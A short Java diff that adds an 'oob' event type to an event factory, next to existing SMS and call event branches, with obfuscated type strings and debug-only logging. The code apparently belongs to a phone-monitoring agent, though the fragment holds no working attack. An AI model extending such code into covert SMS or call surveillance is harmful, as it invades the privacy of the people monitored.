@@ -49,6 +49,13 @@ public class FactoryEvent implements AbstractFactory<BaseEvent, String> {
 			}
 			
 			e = new EventSms();
+		} else if (M.e("oob").equals(type)) { //$NON-NLS-1$
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + "EVENT_OOB");//$NON-NLS-1$ //$NON-NLS-2$
+			}
+
+			e = new EventOOBSms();
 		} else if (M.e("call").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "EVENT_CALL");//$NON-NLS-1$ //$NON-NLS-2$
